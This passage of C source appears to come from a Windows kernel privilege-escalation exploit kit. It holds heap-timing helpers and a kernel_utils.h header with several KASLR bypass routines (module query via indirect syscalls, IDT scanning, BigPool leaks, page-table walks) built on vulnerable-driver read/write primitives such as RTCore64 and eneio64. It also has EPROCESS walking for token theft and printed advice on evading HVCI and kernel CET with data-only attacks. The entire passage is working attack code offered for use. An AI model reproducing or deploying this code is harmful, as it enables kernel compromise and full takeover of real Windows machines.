    for (DWORD i = 0; i < samples - 1; i++) {
        for (DWORD j = i + 1; j < samples; j++) {
            if (timings[j] < timings[i]) {
                DWORD64 tmp = timings[i];
                timings[i] = timings[j];
                timings[j] = tmp;
            }
        }
    }

    DWORD64 sum = 0;
    DWORD validSamples = 0;
    for (DWORD i = samples / 10; i < (samples * 9) / 10; i++) {
        sum += timings[i];
        validSamples++;
    }

    return validSamples > 0 ? (sum / validSamples) : 0;
}

static double CalculateMean(DWORD64* values, DWORD count) {
    DWORD64 sum = 0;
    for (DWORD i = 0; i < count; i++) sum += values[i];
    return (double)sum / count;
}

static double CalculateStdDev(DWORD64* values, DWORD count, double mean) {
    double variance = 0;
    for (DWORD i = 0; i < count; i++) {
        double diff = (double)values[i] - mean;
        variance += diff * diff;
    }
    return sqrt(variance / count);
}

static BOOL AnalyzeLFHActivation(HANDLE hHeap, DWORD allocSize) {
    const DWORD SAMPLE_COUNT = 30;
    DWORD64 preTimings[30];

    DWORD_PTR oldAffinity = SetThreadAffinityMask(GetCurrentThread(), 1);

    for (int i = 0; i < 5; i++) {
        PVOID w = HeapAlloc(hHeap, 0, allocSize);
        if (w) HeapFree(hHeap, 0, w);
    }

    for (DWORD i = 0; i < SAMPLE_COUNT; i++) {
        _mm_lfence();
        DWORD64 start = __rdtsc();
        PVOID alloc = HeapAlloc(hHeap, 0, allocSize);
        _mm_lfence();
        DWORD64 end = __rdtsc();
        preTimings[i] = end - start;
        if (alloc) HeapFree(hHeap, 0, alloc);
    }

    double preMean = CalculateMean(preTimings, SAMPLE_COUNT);
    double preStdDev = CalculateStdDev(preTimings, SAMPLE_COUNT, preMean);

    PVOID triggerAllocs[20];
    for (int i = 0; i < 18; i++) triggerAllocs[i] = HeapAlloc(hHeap, 0, allocSize);

    _mm_lfence();
    DWORD64 postStart = __rdtsc();
    PVOID testAlloc = HeapAlloc(hHeap, 0, allocSize);
    _mm_lfence();
    DWORD64 postEnd = __rdtsc();
    DWORD64 postActivation = postEnd - postStart;
    if (testAlloc) HeapFree(hHeap, 0, testAlloc);

    if (oldAffinity) SetThreadAffinityMask(GetCurrentThread(), oldAffinity);

    BOOL activated = (preMean > 0) && (
        fabs((double)postActivation - preMean) > (2.0 * preStdDev) ||
        postActivation < preMean * 0.7 ||
        postActivation > preMean * 1.5
    );

    for (int i = 0; i < 18; i++) if (triggerAllocs[i]) HeapFree(hHeap, 0, triggerAllocs[i]);

    return activated;
}

static BOOL AnalyzeSegmentHeap(PVOID resultPtr) {
    HANDLE hHeap = GetProcessHeap();
    (void)resultPtr;
    ULONG heapInfo = 0;
    SIZE_T returnLength = 0;

    if (HeapQueryInformation(hHeap, HeapCompatibilityInformation, &heapInfo, sizeof(heapInfo), &returnLength)) {
        return (heapInfo >= 3);
    }

    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(hHeap, &mbi, sizeof(mbi))) {
        PVOID testAlloc = HeapAlloc(hHeap, 0, 0x100);
        if (testAlloc) {
            if (VirtualQuery(testAlloc, &mbi, sizeof(mbi))) {
                BOOL isSegment = (mbi.AllocationBase != hHeap);
                HeapFree(hHeap, 0, testAlloc);
                return isSegment;
            }
            HeapFree(hHeap, 0, testAlloc);
        }
    }
    return FALSE;
}

#endif // HEAP_UTILS_H
```

#### kernel_utils.h

```c
// headers\kernel_utils.h
#ifndef KERNEL_UTILS_H
#define KERNEL_UTILS_H

#include "exploit_common.h"
#include "syscalls.h"
#include <stdio.h>
#include <psapi.h>
#include <intrin.h>

#pragma comment(lib, "psapi.lib")

// CR3 search constants
#define CR3_SEARCH_START            0x1000ULL
#define CR3_SEARCH_ALIGNMENT        0x1000ULL

static DWORD64 GetCR3SearchEnd(DWORD64 maxPhys) {
    if (maxPhys > 0x1000000ULL) {
        return maxPhys - 0x1000000ULL;
    }
    return 0x40000000ULL;  // Fallback to 1GB
}

extern BOOL KernelRead32(DWORD64 address, PDWORD outValue);
extern BOOL KernelRead64(DWORD64 address, PDWORD64 outValue);
extern BOOL KernelWrite32(DWORD64 address, DWORD value);
extern BOOL KernelWrite64(DWORD64 address, DWORD64 value);

static BOOL IsValidKernelAddress(DWORD64 address) {
    DWORD64 topBits = address & 0xFFFF000000000000ULL;
    if (topBits != 0xFFFF000000000000ULL) {
        return FALSE;
    }

    if (address == 0 || address == (DWORD64)-1) {
        return FALSE;
    }

    if (address < 0xFFFF800000000000ULL) {
        return FALSE;
    }

    return TRUE;
}

static DWORD64 FindEPROCESSByPID(DWORD64 systemEPROCESS, DWORD targetPID, KERNEL_OFFSETS* offsets) {
    DWORD64 currentEPROCESS = systemEPROCESS;
    DWORD64 firstEPROCESS = systemEPROCESS;
    int count = 0;

    do {
        count++;
        if (!IsValidKernelAddress(currentEPROCESS)) return 0;

        DWORD pid = 0;
        if (!KernelRead32(currentEPROCESS + offsets->EprocessUniqueProcessId, &pid)) return 0;
        if (pid > 4194304) return 0; // Windows max PID is ~4M
        if (pid == targetPID) return currentEPROCESS;

        DWORD64 flink = 0;
        if (!KernelRead64(currentEPROCESS + offsets->EprocessActiveProcessLinks, &flink)) return 0;
        if (!IsValidKernelAddress(flink)) return 0;

        currentEPROCESS = flink - offsets->EprocessActiveProcessLinks;

        if (count > 1 && currentEPROCESS == firstEPROCESS) break;
        if (count > 2000) return 0; // Increased limit for busy systems

    } while (TRUE);

    return 0;
}

static DWORD64 FindPsInitialSystemProcess(DWORD64 kernelBase) {
    HMODULE hNtoskrnl = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtoskrnl) return 0;

    PVOID pPsInitialSystemProcess = GetProcAddress(hNtoskrnl, "PsInitialSystemProcess");
    if (!pPsInitialSystemProcess) {
        FreeLibrary(hNtoskrnl);
        return 0;
    }

    DWORD64 offset = (DWORD64)pPsInitialSystemProcess - (DWORD64)hNtoskrnl;
    DWORD64 psInitialSystemProcessAddr = kernelBase + offset;
    FreeLibrary(hNtoskrnl);

    DWORD64 systemEPROCESS = 0;
    if (!KernelRead64(psInitialSystemProcessAddr, &systemEPROCESS)) return 0;
    if ((systemEPROCESS & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) return 0;

    return systemEPROCESS;
}

static DWORD64 LeakKernelBaseViaQuery(pNtQuerySystemInformation_t fnNtQuerySystemInformation, SYSCALL_ENTRY* syscallEntry) {
    #define SystemModuleInformation 11

    typedef struct _RTL_PROCESS_MODULE_INFORMATION {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

    typedef struct _RTL_PROCESS_MODULES {
        ULONG NumberOfModules;
        RTL_PROCESS_MODULE_INFORMATION Modules[1];
    } RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

    ULONG bufferSize = 0;
    NTSTATUS status;
    printf("[*] Inside LeakKernelBaseViaQuery. Buffer size: %lu\n", bufferSize); fflush(stdout);

    if (syscallEntry && syscallEntry->resolved) {
        printf("[*] Executing indirect syscall for NtQuerySystemInformation...\n"); fflush(stdout);
        status = ExecuteIndirectSyscall(syscallEntry,
            (PVOID)SystemModuleInformation, NULL, (PVOID)0, &bufferSize,
            NULL, NULL, NULL, NULL, NULL, NULL);
    } else if (fnNtQuerySystemInformation) {
        printf("[*] Executing direct API call for NtQuerySystemInformation...\n"); fflush(stdout);
        status = fnNtQuerySystemInformation(SystemModuleInformation, NULL, 0, &bufferSize);
    } else {
        return 0;
    }

    printf("[*] First query status: 0x%08X, required size: %lu\n", status, bufferSize); fflush(stdout);

    if (bufferSize == 0) return 0;

    PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(bufferSize);
    if (!modules) return 0;

    if (syscallEntry && syscallEntry->resolved) {
        printf("[*] Executing indirect syscall for module list...\n"); fflush(stdout);
        status = ExecuteIndirectSyscall(syscallEntry,
            (PVOID)SystemModuleInformation, modules, (PVOID)(ULONG_PTR)bufferSize, &bufferSize,
            NULL, NULL, NULL, NULL, NULL, NULL);
    } else if (fnNtQuerySystemInformation) {
        printf("[*] Executing direct API call for module list...\n"); fflush(stdout);
        status = fnNtQuerySystemInformation(SystemModuleInformation, modules, bufferSize, &bufferSize);
    } else {
        free(modules);
        return 0;
    }

    printf("[*] Second query status: 0x%08X\n", status); fflush(stdout);

    if (!NT_SUCCESS(status)) {
        free(modules);
        return 0;
    }

    DWORD64 kernelBase = 0;
    if (modules->NumberOfModules > 0) {
        kernelBase = (DWORD64)modules->Modules[0].ImageBase;
    }

    free(modules);
    return kernelBase;
}

// BYOVD kernel base leak via SIDT + IDT entry parsing
// Safe for drivers without SEH (e.g. RTCore64) — only reads guaranteed-mapped pages
// 1. SIDT (unprivileged) → IDT base (always mapped)
// 2. Read IDT entries → ISR handler addresses (inside ntoskrnl, always mapped)
// 3. Align down to 2MB, scan backward for MZ header (within ntoskrnl image, safe)
static DWORD64 LeakKernelBaseViaBYOVD(void) {
    // Step 1: Get IDT base via SIDT (ring-3 legal on x86/x64)
    BYTE idtr_buf[10] = {0};
    __sidt(idtr_buf);
    DWORD64 idtBase = *(DWORD64*)(idtr_buf + 2);

    if (!IsValidKernelAddress(idtBase)) {
        printf("[-] LeakKernelBaseViaBYOVD: SIDT returned invalid base 0x%llx\n", idtBase);
        fflush(stdout);
        return 0;
    }
    printf("[*] LeakKernelBaseViaBYOVD: IDT Base = 0x%llx\n", idtBase);
    fflush(stdout);

    // Step 2: Read IDT entries to get an ntoskrnl address
    // Try multiple entries (0=DivideError, 1=Debug, 2=NMI, 0xE=PageFault)
    // x64 IDT entry (16 bytes):
    //   +0x00: WORD OffsetLow    +0x02: WORD Selector
    //   +0x04: BYTE IST          +0x05: BYTE TypeAttr
    //   +0x06: WORD OffsetMid    +0x08: DWORD OffsetHigh
    //   +0x0C: DWORD Reserved
    int tryEntries[] = { 0x0E, 0x00, 0x01, 0x02, 0x03 };
    DWORD64 isrAddr = 0;

    for (int t = 0; t < sizeof(tryEntries)/sizeof(tryEntries[0]); t++) {
        DWORD64 entryAddr = idtBase + (tryEntries[t] * 16);

        DWORD dw0 = 0, dw1 = 0, dw2 = 0;
        if (!KernelRead32(entryAddr, &dw0)) continue;
        if (!KernelRead32(entryAddr + 4, &dw1)) continue;
        if (!KernelRead32(entryAddr + 8, &dw2)) continue;

        // Reconstruct 64-bit ISR address from IDT gate descriptor fields
        DWORD64 addr = ((DWORD64)dw2 << 32)
                     | ((DWORD64)(dw1 >> 16) << 16)
                     | (DWORD64)(dw0 & 0xFFFF);

        if (IsValidKernelAddress(addr)) {
            isrAddr = addr;
            printf("[*] LeakKernelBaseViaBYOVD: IDT[0x%X] → ISR at 0x%llx\n",
                   tryEntries[t], isrAddr);
            fflush(stdout);
            break;
        }
    }

    if (!isrAddr) {
        printf("[-] LeakKernelBaseViaBYOVD: Could not extract ISR from IDT\n");
        fflush(stdout);
        return 0;
    }

    // Step 3: Scan backward from ISR at 2MB alignment for MZ/PE header
    // ntoskrnl is ~10-12MB so at most 6-8 steps of 2MB back from any ISR
    DWORD64 candidate = isrAddr & ~0x1FFFFFULL;  // 2MB align down

    for (int i = 0; i < 16; i++) {
        DWORD mz = 0;
        if (!KernelRead32(candidate, &mz)) goto next;
        if ((mz & 0xFFFF) != 0x5A4D) goto next;

        DWORD e_lfanew = 0;
        if (!KernelRead32(candidate + 0x3C, &e_lfanew)) goto next;
        if (e_lfanew == 0 || e_lfanew > 0x1000) goto next;

        DWORD pe_sig = 0;
        if (!KernelRead32(candidate + e_lfanew, &pe_sig)) goto next;
        if (pe_sig != 0x00004550) goto next;  // "PE\0\0"

        printf("[+] LeakKernelBaseViaBYOVD: ntoskrnl base = 0x%llx\n", candidate);
        fflush(stdout);
        return candidate;

    next:
        if (candidate < 0x200000) break;
        candidate -= 0x200000;
    }

    printf("[-] LeakKernelBaseViaBYOVD: MZ header not found scanning back from ISR\n");
    fflush(stdout);
    return 0;
}

// Deduce kernel virtual base from known physical base by reverse page-table walk
// For physical-memory BYOVD (eneio64): we know physBase, scan CR3 candidates and
// check which virtual address 0xFFFFF800'XXXXXXXX maps to physBase
static DWORD64 DeduceVirtualBaseFromPhysical(BYTE* physMemMap, DWORD64 physBase,
                                              DWORD64 maxPhys) {
    printf("[*] DeduceVirtualBaseFromPhysical: physBase=0x%llx, scanning page tables...\n",
           physBase);
    fflush(stdout);

    DWORD64 searchEnd = (maxPhys > 0x1000000ULL) ? (maxPhys - 0x1000000ULL) : maxPhys;
    if (searchEnd > 0x40000000ULL) searchEnd = 0x40000000ULL;  // Cap at 1GB

    for (DWORD64 testCr3 = 0x1000; testCr3 < searchEnd; testCr3 += 0x1000) {
        __try {
            DWORD64 pml4Base = testCr3 & 0xFFFFFFFFF000ULL;
            if (pml4Base + 0x1000 >= maxPhys) continue;

            for (WORD pml4Idx = 496; pml4Idx <= 511; pml4Idx++) {
                DWORD64 pml4eAddr = pml4Base + (pml4Idx * 8);
                if (pml4eAddr + 8 >= maxPhys) continue;

                DWORD64 pml4e = *(DWORD64*)(physMemMap + pml4eAddr);
                if (!(pml4e & 1)) continue;

                DWORD64 pdptBase = pml4e & 0xFFFFFFFFF000ULL;
                if (pdptBase + 0x1000 >= maxPhys) continue;

                for (WORD pdptIdx = 0; pdptIdx < 512; pdptIdx++) {
                    DWORD64 pdpteAddr = pdptBase + (pdptIdx * 8);
                    if (pdpteAddr + 8 >= maxPhys) continue;

                    DWORD64 pdpte = *(DWORD64*)(physMemMap + pdpteAddr);
                    if (!(pdpte & 1)) continue;

                    // 1GB page
                    if (pdpte & (1ULL << 7)) continue;  // ntoskrnl isn't in a 1GB page

                    DWORD64 pdBase = pdpte & 0xFFFFFFFFF000ULL;
                    if (pdBase + 0x1000 >= maxPhys) continue;

                    for (WORD pdIdx = 0; pdIdx < 512; pdIdx++) {
                        DWORD64 pdeAddr = pdBase + (pdIdx * 8);
                        if (pdeAddr + 8 >= maxPhys) continue;

                        DWORD64 pde = *(DWORD64*)(physMemMap + pdeAddr);
                        if (!(pde & 1)) continue;

                        DWORD64 mappedPhys;
                        if (pde & (1ULL << 7)) {
                            mappedPhys = pde & 0xFFFFFFFFE00000ULL;
                        } else {
                            DWORD64 ptBase = pde & 0xFFFFFFFFF000ULL;
                            if (ptBase + 8 >= maxPhys) continue;
                            DWORD64 pte = *(DWORD64*)(physMemMap + ptBase);
                            if (!(pte & 1)) continue;
                            mappedPhys = pte & 0xFFFFFFFFF000ULL;
                        }

                        if (mappedPhys == physBase) {
                            DWORD64 vaddr = 0xFFFF000000000000ULL  // canonical high bits
                                | ((DWORD64)pml4Idx << 39)
                                | ((DWORD64)pdptIdx << 30)
                                | ((DWORD64)pdIdx << 21);

                            if (physBase + 2 < maxPhys) {
                                WORD mz = *(WORD*)(physMemMap + physBase);
                                if (mz == 0x5A4D) {
                                    printf("[+] DeduceVirtualBaseFromPhysical: CR3=0x%llx, VirtBase=0x%llx\n",
                                           testCr3, vaddr);
                                    fflush(stdout);
                                    return vaddr;
                                }
                            }
                        }
                    }
                }
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }

    printf("[-] DeduceVirtualBaseFromPhysical: failed to deduce virtual base\n");
    fflush(stdout);
    return 0;
}

// KASLR bypass via SystemBigPoolInformation (class 0x42)
// The BigPool table contains large non-paged pool allocations.
// ntoskrnl itself is *not* listed there directly, but its large section
// mappings (Mm, Se, Cm pool tags) are.  From the lowest-addressed such
// entry we scan backward in 0x1000-byte steps for an MZ/PE header.
static DWORD64 LeakKernelBaseViaBigPool(pNtQuerySystemInformation_t fnNtQuerySystemInformation) {
#define SystemBigPoolInformation 0x42

    typedef struct _SYSTEM_BIGPOOL_ENTRY {
        union {
            PVOID   VirtualAddress;
            ULONG_PTR NonPaged : 1;   // bit 0: 1 = non-paged
        };
        SIZE_T SizeInBytes;
        union {
            UCHAR Tag[4];
            ULONG TagUlong;
        };
    } SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;

    typedef struct _SYSTEM_BIGPOOL_INFORMATION {
        ULONG Count;
        SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
    } SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;

    if (!fnNtQuerySystemInformation) return 0;

    // ── Step 1: query needed size with a retry/grow loop ──────────────────────
    // Pool entries can be added between two calls, so loop until the buffer
    // we allocated is large enough (STATUS_INFO_LENGTH_MISMATCH = 0xC0000004).
    ULONG bufferSize = 0;
    NTSTATUS status;
    int retries = 0;

    // First call: get required size
    status = fnNtQuerySystemInformation(SystemBigPoolInformation, NULL, 0, &bufferSize);
    if (status != (NTSTATUS)0xC0000004 /*STATUS_INFO_LENGTH_MISMATCH*/) {
        printf("[-] LeakKernelBaseViaBigPool: unexpected status 0x%08X on size probe\n", status);
        return 0;
    }
    if (bufferSize == 0) {
        printf("[-] LeakKernelBaseViaBigPool: size probe returned 0 bytes\n");
        return 0;
    }

    PSYSTEM_BIGPOOL_INFORMATION poolInfo = NULL;
    for (retries = 0; retries < 4; retries++) {
        // Add 10% headroom for new entries that may appear between calls
        ULONG allocSize = bufferSize + bufferSize / 10 + 64;
        PSYSTEM_BIGPOOL_INFORMATION tmp =
            (PSYSTEM_BIGPOOL_INFORMATION)realloc(poolInfo, allocSize);
        if (!tmp) { free(poolInfo); return 0; }
        poolInfo = tmp;

        ULONG returned = 0;
        status = fnNtQuerySystemInformation(SystemBigPoolInformation,
                                            poolInfo, allocSize, &returned);
        if (NT_SUCCESS(status)) {
            break;
        }
        if (status == (NTSTATUS)0xC0000004) {
            bufferSize = returned ? returned : allocSize * 2;
            continue;
        }
        printf("[-] LeakKernelBaseViaBigPool: NtQuerySystemInformation failed 0x%08X\n", status);
        free(poolInfo);
        return 0;
    }

    if (!NT_SUCCESS(status)) {
        printf("[-] LeakKernelBaseViaBigPool: buffer still too small after %d retries\n", retries);
        free(poolInfo);
        return 0;
    }

    printf("[*] LeakKernelBaseViaBigPool: %lu big-pool entries\n", poolInfo->Count);

    // ── Step 2: collect kernel addresses from non-paged entries ───────────────
    // Pool entries whose bit0 of VirtualAddress is 1 are non-paged.
    // Mask bit0 off to get the actual address.  Only consider canonical
    // high-half kernel addresses (0xFFFF800000000000+).
    DWORD64 lowestKernelAddr = (DWORD64)-1;

    for (ULONG i = 0; i < poolInfo->Count; i++) {
        PSYSTEM_BIGPOOL_ENTRY e = &poolInfo->AllocatedInfo[i];

        // NonPaged flag lives in bit 0 of the VirtualAddress union
        ULONG_PTR rawPtr = (ULONG_PTR)e->VirtualAddress;
        if (!(rawPtr & 1)) continue;                 // skip paged entries
        DWORD64 addr = (DWORD64)(rawPtr & ~(ULONG_PTR)1);

        if ((addr & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) continue;
        if (e->SizeInBytes == 0) continue;

        if (addr < lowestKernelAddr)
            lowestKernelAddr = addr;
    }

    free(poolInfo);

    if (lowestKernelAddr == (DWORD64)-1) {
        printf("[-] LeakKernelBaseViaBigPool: no usable kernel addresses found\n");
        return 0;
    }

    printf("[*] LeakKernelBaseViaBigPool: lowest non-paged kernel addr = 0x%llx\n",
           lowestKernelAddr);

    // ── Step 3: scan backward for MZ/PE header ────────────────────────────────
    // ntoskrnl is loaded at a 0x1000-aligned address.  Walk back in 0x1000
    // steps from the lowest pool address (which may be inside ntoskrnl or
    // just above it).  Cap the scan at 64 MB backward to avoid false positives
    // from other drivers (hal.dll, nt mappings, etc.).
    DWORD64 scanStart = lowestKernelAddr & ~(DWORD64)0xFFF; // page-align
    DWORD64 scanLimit = (scanStart > 0x4000000ULL)
                        ? scanStart - 0x4000000ULL   // 64 MB back
                        : 0xFFFF800000000000ULL;

    for (DWORD64 candidate = scanStart; candidate >= scanLimit; candidate -= 0x1000) {
        DWORD mz = 0;
        if (!KernelRead32(candidate, &mz)) continue;
        if ((mz & 0xFFFF) != 0x5A4D) continue;           // "MZ"

        DWORD e_lfanew = 0;
        if (!KernelRead32(candidate + 0x3C, &e_lfanew)) continue;
        if (e_lfanew == 0 || e_lfanew > 0x800) continue;  // sanity

        DWORD pe_sig = 0;
        if (!KernelRead32(candidate + e_lfanew, &pe_sig)) continue;
        if (pe_sig != 0x00004550) continue;               // "PE\0\0"

        // Extra check: sizeof image should be > 4MB (ntoskrnl is ~10-15MB)
        DWORD sizeOfImage = 0;
        if (!KernelRead32(candidate + e_lfanew + 0x50, &sizeOfImage)) continue;
        if (sizeOfImage < 0x400000) continue;

        printf("[+] LeakKernelBaseViaBigPool: ntoskrnl base = 0x%llx\n", candidate);
        return candidate;
    }

    printf("[-] LeakKernelBaseViaBigPool: MZ/PE scan failed (no large PE found)\n");
    return 0;
}

// Shared struct for SystemCodeIntegrityInformation (class 0x67)
#define SYSTEM_CODE_INTEGRITY_CLASS 0x67
typedef struct _SYSTEM_CODE_INTEGRITY_INFO {
    ULONG Length;
    ULONG CodeIntegrityOptions;
    ULONG CodeIntegrityFlags;
    ULONG CodeIntegrityPolicyId;
    ULONG CodeIntegrityPolicyNameLength;
    WCHAR CodeIntegrityPolicyName[1];
} SYSTEM_CODE_INTEGRITY_INFO, *PSYSTEM_CODE_INTEGRITY_INFO;

// CI option / flag constants
#define CI_OPTION_ENABLED           0x00000001
#define CI_OPTION_TESTSIGN          0x00000002
#define CI_OPTION_DEBUGMODE         0x00000004
#define CI_OPTION_HVCI              0x00000400
#define CI_OPTION_WHQL_ENFORCEMENT  0x00002000
#define CI_OPTION_UPGRADE_POLICY    0x00004000
#define CI_FLAG_KERNEL_CET_ENABLED  0x00000800

// Safely query Code Integrity options and flags from the kernel.
// On older Windows, SYSTEM_CODE_INTEGRITY_INFO is smaller; providing the full Windows 11
// struct size can fail with STATUS_INFO_LENGTH_MISMATCH. We query exactly what we need.
static BOOL QueryCodeIntegrity(pNtQuerySystemInformation_t fnNtQuerySystemInformation,
                               PDWORD pOptions, PDWORD pFlags) {
    if (!fnNtQuerySystemInformation) return FALSE;

    // Minimum struct to cover Length, CodeIntegrityOptions, and CodeIntegrityFlags
    struct {
        ULONG Length;
        ULONG CodeIntegrityOptions;
        ULONG CodeIntegrityFlags;
    } ci = {0};

    ci.Length = sizeof(ci);
    ULONG returnLength = 0;
    NTSTATUS status = fnNtQuerySystemInformation(
        SYSTEM_CODE_INTEGRITY_CLASS, &ci, sizeof(ci), &returnLength);

    if (!NT_SUCCESS(status)) {
        if ((ULONG)status != 0xC0000003) // STATUS_INVALID_INFO_CLASS
            printf("[-] QueryCodeIntegrity: NtQuerySystemInformation 0x%08X\n", status);
        if (pOptions) *pOptions = 0;
        if (pFlags) *pFlags = 0;
        return FALSE;
    }

    if (pOptions) *pOptions = ci.CodeIntegrityOptions;
    if (pFlags) *pFlags = ci.CodeIntegrityFlags;
    return TRUE;
}

// Helper wrapper that also prints the flags
static DWORD QueryAndPrintCodeIntegrityFlags(pNtQuerySystemInformation_t fnNtQuerySystemInformation) {
    DWORD opts = 0, flags = 0;
    if (!QueryCodeIntegrity(fnNtQuerySystemInformation, &opts, &flags)) return 0;

    printf("[*] CodeIntegrityOptions: 0x%08X", opts);
    if (opts & CI_OPTION_ENABLED)          printf(" ENABLED");
    if (opts & CI_OPTION_TESTSIGN)         printf(" TESTSIGN");
    if (opts & CI_OPTION_DEBUGMODE)        printf(" DEBUGMODE");
    if (opts & CI_OPTION_HVCI)             printf(" HVCI");
    if (opts & CI_OPTION_WHQL_ENFORCEMENT) printf(" WHQL");
    if (opts & CI_OPTION_UPGRADE_POLICY)   printf(" UPGRADEPOLICY");
    printf("\n");

    return opts;
}

#define SECURITY_FEATURE_HVCI           0x00000001
#define SECURITY_FEATURE_VBS            0x00000002
#define SECURITY_FEATURE_CET            0x00000004
#define SECURITY_FEATURE_CFG            0x00000008
#define SECURITY_FEATURE_KERNEL_CET     0x00000010
#define SECURITY_FEATURE_KERNEL_CFI     0x00000020

typedef struct _SECURITY_FEATURES {
    DWORD Features;
    BOOL  HvciEnabled;
    BOOL  VbsEnabled;
    BOOL  KernelCetEnabled;
    BOOL  KernelCfiEnabled;
    DWORD CodeIntegrityOptions;
    DWORD CodeIntegrityFlags;
} SECURITY_FEATURES, *PSECURITY_FEATURES;

static BOOL IsHvciEnabled(pNtQuerySystemInformation_t fnNtQuerySystemInformation) {
    DWORD opts = 0;
    if (!QueryCodeIntegrity(fnNtQuerySystemInformation, &opts, NULL)) return FALSE;
    return (opts & CI_OPTION_HVCI) != 0;
}

static BOOL IsVbsEnabled(void) {
    HKEY hKey;
    DWORD vbsEnabled = 0;
    DWORD size = sizeof(DWORD);

    const char* vbsKeyPath = "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard";
    const char* vbsValueName = "EnableVirtualizationBasedSecurity";

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vbsKeyPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, vbsValueName, NULL, NULL, (LPBYTE)&vbsEnabled, &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return vbsEnabled != 0;
        }
        RegCloseKey(hKey);
    }

    return FALSE;
}

static BOOL IsKernelCetEnabled(pNtQuerySystemInformation_t fnNtQuerySystemInformation) {
    DWORD flags = 0;
    if (!QueryCodeIntegrity(fnNtQuerySystemInformation, NULL, &flags)) return FALSE;
    return (flags & CI_FLAG_KERNEL_CET_ENABLED) != 0;
}

static BOOL GetSecurityFeatures(pNtQuerySystemInformation_t fnNtQuerySystemInformation,
                                PSECURITY_FEATURES pFeatures) {
    if (!pFeatures || !fnNtQuerySystemInformation) return FALSE;
    memset(pFeatures, 0, sizeof(SECURITY_FEATURES));

    DWORD opts = 0, flags = 0;
    QueryCodeIntegrity(fnNtQuerySystemInformation, &opts, &flags);

    pFeatures->CodeIntegrityOptions = opts;
    pFeatures->CodeIntegrityFlags   = flags;

    pFeatures->HvciEnabled = (opts & CI_OPTION_HVCI) != 0;
    if (pFeatures->HvciEnabled)      pFeatures->Features |= SECURITY_FEATURE_HVCI;

    pFeatures->VbsEnabled = IsVbsEnabled();
    if (pFeatures->VbsEnabled)       pFeatures->Features |= SECURITY_FEATURE_VBS;

    pFeatures->KernelCetEnabled = (flags & CI_FLAG_KERNEL_CET_ENABLED) != 0;
    if (pFeatures->KernelCetEnabled) pFeatures->Features |= SECURITY_FEATURE_KERNEL_CET;

    pFeatures->KernelCfiEnabled = (flags & 0x1000) != 0; // Internal mask
    if (pFeatures->KernelCfiEnabled) pFeatures->Features |= SECURITY_FEATURE_KERNEL_CFI;

    return TRUE;
}

static void PrintSecurityFeatures(PSECURITY_FEATURES pFeatures) {
    if (!pFeatures) return;

    printf("\n[*] Security Features Status:\n");
    printf("    VBS:  %s\n", pFeatures->VbsEnabled ? "ENABLED" : "Disabled");
    printf("    HVCI: %s\n", pFeatures->HvciEnabled ? "ENABLED" : "Disabled");
    printf("    Kernel CET: %s\n", pFeatures->KernelCetEnabled ? "ENABLED" : "Disabled");
    printf("    Kernel CFI: %s\n", pFeatures->KernelCfiEnabled ? "ENABLED" : "Disabled");
    printf("    CI Options: 0x%08X\n", pFeatures->CodeIntegrityOptions);
    printf("    CI Flags:   0x%08X\n", pFeatures->CodeIntegrityFlags);

    if (pFeatures->HvciEnabled) {
        printf("\n[!] HVCI ENABLED - Exploitation Constraints:\n");
        printf("    - Kernel shellcode: BLOCKED (code pages immutable)\n");
        printf("    - ROP/JOP: Limited to existing code\n");
        printf("    - Token stealing: VIABLE (data-only attack)\n");
        printf("    - Recommended: Use data-only techniques\n");
    }

    if (pFeatures->KernelCetEnabled) {
        printf("\n[!] KERNEL CET ENABLED - Additional Constraints:\n");
        printf("    - Shadow stack validates return addresses\n");
        printf("    - ROP chains will trigger #CP exception\n");
        printf("    - Use JOP/COP or data-only techniques\n");
    }
}

// SelectKASLRBypassMethod - full control variant
// hasSeDebugPrivilege : TRUE if the caller holds SeDebugPrivilege
//                       (NtQuerySystemInformation/SystemModuleInformation works)
// hasBYOVD            : TRUE if a kernel R/W primitive (e.g. RTCore64, IDT scan)
//                       is already established and LeakKernelBaseViaBYOVD() can run
// syscallEntry        : optional resolved indirect-syscall entry for
//                       NtQuerySystemInformation (NULL → use function pointer)
//
// On success returns the ntoskrnl virtual base; on failure returns 0.
// The caller is responsible for treating a 0 return as a fatal condition
// when appropriate.
static DWORD64 SelectKASLRBypassMethod(pNtQuerySystemInformation_t fnNtQuerySystemInformation,
                                        pRtlGetVersion_t fnRtlGetVersion,
                                        BOOL hasSeDebugPrivilege,
                                        BOOL hasBYOVD,
                                        SYSCALL_ENTRY* syscallEntry) {
    RTL_OSVERSIONINFOW ver = {0};
    ver.dwOSVersionInfoSize = sizeof(ver);
    if (fnRtlGetVersion) fnRtlGetVersion(&ver);

    printf("[*] KASLR bypass: Build=%lu  SeDebug=%s  BYOVD=%s  Syscall=%s\n",
           ver.dwBuildNumber,
           hasSeDebugPrivilege ? "YES" : "NO",
           hasBYOVD            ? "YES" : "NO",
           (syscallEntry && syscallEntry->resolved) ? "YES" : "NO");

    // ── Windows 11 24H2+ (build 26100+): SystemModuleInformation requires SeDebug ──
    if (ver.dwBuildNumber >= 26100) {
        printf("[*] Windows 11 24H2+ - restricted KASLR bypass path\n");

        // 1. Prefer NtQuerySystemInformation when privilege is available
        if (hasSeDebugPrivilege || (syscallEntry && syscallEntry->resolved)) {
            printf("[*] Attempting NtQuerySystemInformation (SystemModuleInformation)...\n");
            fflush(stdout);
